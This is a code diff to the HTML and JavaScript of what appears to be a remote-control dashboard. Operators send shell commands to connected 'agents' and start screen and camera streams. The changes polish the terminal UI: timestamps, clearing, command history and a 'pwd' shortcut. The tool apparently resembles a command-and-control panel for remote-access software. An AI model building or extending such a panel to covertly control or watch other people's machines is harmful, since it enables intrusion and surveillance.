@@ -875,12 +875,29 @@ DASHBOARD_HTML = r'''
             white-space: pre-wrap;
             word-wrap: break-word;
             position: relative;
+            line-height: 1.4;
+            font-size: 14px;
         }
 
         .output-terminal::before {
             content: "NEURAL_TERMINAL_v2.1 > ";
             color: var(--accent-blue);
             font-weight: bold;
+        }
+
+        .terminal-prompt {
+            color: var(--accent-blue);
+            font-weight: bold;
+        }
+
+        .terminal-output {
+            color: var(--accent-green);
+            margin: 5px 0;
+        }
+
+        .terminal-error {
+            color: var(--accent-red);
+            margin: 5px 0;
         }
 
         .status-indicator {
@@ -1067,12 +1084,14 @@ DASHBOARD_HTML = r'''
                             <input type="text" class="neural-input" id="command" placeholder="Enter command to execute...">
                         </div>
                         <button class="btn" onclick="issueCommand()">Execute Command</button>
+                        <button class="btn btn-danger" onclick="clearTerminal()">Clear Terminal</button>
                         <div id="command-status" class="status-indicator"></div>
                     </div>
 
                     <div class="control-group">
                         <div class="control-header">Quick Actions</div>
                         <button class="btn" onclick="listProcesses()">List Processes</button>
+                        <button class="btn" onclick="showCurrentDirectory()">Show Directory</button>
                         <button class="btn" onclick="startScreenStream()">Screen Stream</button>
                         <button class="btn" onclick="startCameraStream()">Camera Stream</button>
                         <button class="btn btn-danger" onclick="stopAllStreams()">Stop All Streams</button>
@@ -1217,7 +1236,13 @@ DASHBOARD_HTML = r'''
             document.querySelectorAll('.agent-card').forEach(item => item.classList.remove('selected'));
             element.classList.add('selected');
             document.getElementById('agent-id').value = agentId;
-            document.getElementById('output-display').textContent = `Agent ${agentId.substring(0,8)}... selected. Ready for commands.`;
+            
+            // Clear terminal and show agent selection message
+            const outputDisplay = document.getElementById('output-display');
+            const timestamp = new Date().toLocaleTimeString();
+            outputDisplay.textContent = `[${timestamp}] Agent ${agentId.substring(0,8)}... selected. Ready for commands.\n[${timestamp}] Terminal initialized. Type commands below.\n`;
+            outputDisplay.scrollTop = outputDisplay.scrollHeight;
+            
             document.getElementById('command-status').style.display = 'none';
         }
 
@@ -1269,9 +1294,30 @@ DASHBOARD_HTML = r'''
                 return;
             }
 
+            const outputDisplay = document.getElementById('output-display');
+            const currentContent = outputDisplay.textContent;
+            const timestamp = new Date().toLocaleTimeString();
+            const newContent = currentContent + `\n[${timestamp}] > ${command}\n[${timestamp}] Executing...\n`;
+            outputDisplay.textContent = newContent;
+            outputDisplay.scrollTop = outputDisplay.scrollHeight;
+            
             socket.emit('execute_command', { agent_id: selectedAgentId, command: command });
-            document.getElementById('output-display').textContent = `> ${command}\nExecuting...`;
             document.getElementById('command').value = '';
+        }
+
+        function clearTerminal() {
+            const outputDisplay = document.getElementById('output-display');
+            const timestamp = new Date().toLocaleTimeString();
+            outputDisplay.textContent = `[${timestamp}] Terminal cleared. System ready. Awaiting commands...`;
+            outputDisplay.scrollTop = outputDisplay.scrollHeight;
+        }
+
+        function showCurrentDirectory() {
+            if (!selectedAgentId) {
+                showStatus('Please select an agent first.', 'error');
+                return;
+            }
+            issueCommandInternal(selectedAgentId, 'pwd');
         }
 
         function issueCommandInternal(agentId, command) {
@@ -1357,11 +1403,18 @@ DASHBOARD_HTML = r'''
         });
 
         socket.on('command_output', (data) => {
+            console.log('🔍 Main-controller: command_output received:', data);
             if (data.agent_id === selectedAgentId) {
                 const outputDisplay = document.getElementById('output-display');
                 // Append new output, keeping previous content
-                outputDisplay.textContent += `\n${data.output}`;
+                const currentContent = outputDisplay.textContent;
+                const timestamp = new Date().toLocaleTimeString();
+                const newContent = currentContent + `\n[${timestamp}] ${data.output}`;
+                outputDisplay.textContent = newContent;
                 outputDisplay.scrollTop = outputDisplay.scrollHeight; // Scroll to bottom
+                console.log('🔍 Main-controller: Output updated in terminal');
+            } else {
+                console.log('🔍 Main-controller: Command output for different agent:', data.agent_id, 'Selected:', selectedAgentId);
             }
         });
 
@@ -1370,9 +1423,32 @@ DASHBOARD_HTML = r'''
         });
 
         // Add key listener to command input
+        let commandHistory = [];
+        let historyIndex = -1;
+
         document.getElementById('command').addEventListener('keyup', function(event) {
             if (event.key === 'Enter') {
+                const command = this.value.trim();
+                if (command) {
+                    commandHistory.push(command);
+                    historyIndex = commandHistory.length;
+                }
                 issueCommand();
+            } else if (event.key === 'ArrowUp') {
+                event.preventDefault();
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    this.value = commandHistory[historyIndex];
+                }
+            } else if (event.key === 'ArrowDown') {
+                event.preventDefault();
+                if (historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    this.value = commandHistory[historyIndex];
+                } else {
+                    historyIndex = commandHistory.length;
+                    this.value = '';
+                }
             }
         });
 
